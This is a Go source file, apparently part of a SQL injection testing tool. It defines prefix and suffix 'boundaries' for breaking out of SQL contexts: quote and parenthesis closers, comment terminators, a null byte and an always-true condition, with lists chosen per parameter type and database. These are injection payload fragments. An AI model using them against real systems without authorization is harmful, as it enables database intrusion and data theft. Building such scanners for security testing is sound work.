package payload

import "strings"

// Parameter type constants matching engine.ParameterType values.
const (
	TypeString  = 0
	TypeInteger = 1
	TypeFloat   = 2
)

// Boundary represents a prefix/suffix pair for closing SQL context.
type Boundary struct {
	Prefix  string
	Suffix  string
	Comment string // Optional description
}

// CommonBoundaries returns all common prefix/suffix pairs to try.
// These are ordered by likelihood/simplicity.
func CommonBoundaries() []Boundary {
	return []Boundary{
		// Numeric context (no prefix needed)
		{"", "-- -", "numeric, comment"},
		{"", "#", "numeric, hash comment"},
		{"", "/*", "numeric, block comment"},

		// Single quote string context
		{"'", "-- -", "single quote, comment"},
		{"'", "#", "single quote, hash comment"},
		{"'", "/*", "single quote, block comment"},
		{"'", "AND '1'='1", "single quote, balanced"},

		// Double quote string context
		{"\"", "-- -", "double quote, comment"},
		{"\"", "#", "double quote, hash comment"},

		// Parenthesized expressions
		{")", "-- -", "close paren, comment"},
		{"')", "-- -", "single quote close paren, comment"},
		{"\")", "-- -", "double quote close paren, comment"},
		{"'))", "-- -", "double close paren, comment"},

		// With semicolon
		{";", "-- -", "semicolon, comment"},
		{"';", "-- -", "single quote semicolon, comment"},

		// Null byte
		{"", "%00", "null byte suffix"},
	}
}

// PrefixesForType returns likely prefixes based on parameter type.
// TypeInteger (1): "", ")", "))"
// TypeString (0) or TypeFloat (2): "'", "\"", "')", "\")", "'))"
func PrefixesForType(paramType int) []string {
	switch paramType {
	case TypeInteger:
		return []string{"", ")", "))"}
	case TypeString, TypeFloat:
		return []string{"'", "\"", "')", "\")", "'))"}
	default:
		// Fallback: return all common prefixes.
		return []string{"", "'", "\"", ")", "')", "\")", "))"}
	}
}

// SuffixesForDBMS returns likely suffixes for a given DBMS.
// MySQL: "-- -", "#", "/*"
// PostgreSQL: "-- -", "/*"
// Generic: "-- -", "#", "/*", "%00"
func SuffixesForDBMS(dbms string) []string {
	switch strings.ToLower(dbms) {
	case "mysql":
		return []string{"-- -", "#", "/*"}
	case "postgresql":
		return []string{"-- -", "/*"}
	default:
		return []string{"-- -", "#", "/*", "%00"}
	}
}
